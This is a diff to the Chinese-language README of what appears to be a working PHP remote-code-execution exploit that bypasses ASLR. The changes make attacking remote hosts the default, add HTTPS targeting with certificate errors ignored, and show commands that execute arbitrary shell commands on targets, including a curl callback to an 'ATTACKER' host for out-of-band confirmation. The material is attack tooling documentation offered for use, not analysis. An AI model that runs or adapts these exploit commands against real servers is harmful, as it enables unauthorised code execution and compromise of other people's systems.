@@ -36,8 +36,8 @@ cd php2shell-bypass-aslr-exp
 # workers: official (run exploit with --workers 150)
 
 # 2) 一条命令：A1 -> B1 泄漏 -> A2 -> B2 -> id
-# 默认IP为127.0.0.1
-python3 exploit.py --port 18110
+# 默认IP为127.0.0.1；--verify 让脚本读本地 out/p1 确认（仅本地 lab 有意义）
+python3 exploit.py --port 18110 --verify
 #       target 127.0.0.1:18110
 #       pinned 150/150 workers (149 holders)
 # [try 1] A1: END-cleanup send_cookie OOM
@@ -61,28 +61,39 @@ Linux 上没有 docker 组权限时脚本会自动改用 `sudo docker`，也可�
 
 ```bash
 # 换新 ASLR 复测（重启容器）
-python3 exploit.py --port 18110 --restart p2s-pure-18110
+python3 exploit.py --port 18110 --restart p2s-pure-18110 --verify
 
 # 官方 worker 是默认值；--single 起的单 worker 目标用 --workers 1
-python3 exploit.py --port 18110 --workers 1
+python3 exploit.py --port 18110 --workers 1 --verify
 
 # 自定义命令：把脚本写进挂载目录，再用 sh 执行
 printf 'id; uname -a > /out/p1\n' > out/c
-python3 exploit.py --port 18110 --cmd 'sh</out/c'
+python3 exploit.py --port 18110 --cmd 'sh</out/c' --verify
 
 # 远程目标：--host（别名 --ip）指定 IP/域名，--cmd 指定要执行的命令
-python3 exploit.py --host 10.0.0.5 --port 80 --cmd 'id>/tmp/p1'
+# 默认不校验本地 proof，打完就返回；结果用带外方式确认
+python3 exploit.py --host target.example.com --port 80 --cmd 'id>/tmp/p1'
 
-# 拿不到本地 proof 文件时加 --no-verify：把三个 main-chunk 候选都打一遍，
-# 结果用带外方式（DNS/HTTP 回连或写 web 目录）确认
-python3 exploit.py --host 10.0.0.5 --port 80 --cmd 'curl -s http://ATTACKER/ok' --no-verify
+# HTTPS 目标：证书校验默认关闭（支持自签名证书）
+python3 exploit.py --host https://target.example.com --port 443 --cmd 'id>/tmp/p1'
+# 也可以使用：python3 exploit.py --host target.example.com --https --cmd 'id>/tmp/p1'
+
+# 带外确认示例（DNS/HTTP 回连或写 web 目录）
+python3 exploit.py --host 10.0.0.5 --port 80 --cmd 'curl -s http://ATTACKER/ok'
 
 # 命令较长或含引号/换行时，直接从文件读取（覆盖 --cmd）
-python3 exploit.py --host 10.0.0.5 --port 80 --workers 150 --retries 1 --no-verify --cmd-file out/c
+python3 exploit.py --host 10.0.0.5 --port 80 --workers 150 --retries 1 --cmd-file out/c
 ```
 
 `--cmd` 走的是 384 字节 fake zend_array 载体，命令最长 200 字节（0x160-0x98）；
-超长会在启动时直接报错。`--host` 默认 `127.0.0.1`，本地 lab 用法不变。
+超长会在启动时直接报错。`--host` 默认 `127.0.0.1`，支持主机名、IP 以及 `http://` / `https://` URL。
+使用 HTTPS 时传输链路（包括辅助请求）会统一使用 TLS，并忽略证书错误；
+`--port` 未指定时 HTTP 默认 18110、HTTPS 默认 443。
+
+默认行为是**纯攻击模式**：把泄漏出的 main-chunk 候选逐个打完就返回，不读
+目标侧文件，也不判断本地 `out/p1`（远程目标本地永远读不到，会产生假阴性）。
+只有目标能把 proof 写回本机时才加 `--verify` 去轮询 `--proof`；
+`--no-verify` 保留为兼容写法，等价于默认行为。
 
 `--retries` 默认 3；如果某次越界窗口里最常见的指针不是
 `zval_ptr_dtor`，脚本会用 `libphp-main` 的合理区间检查丢弃这次泄漏，
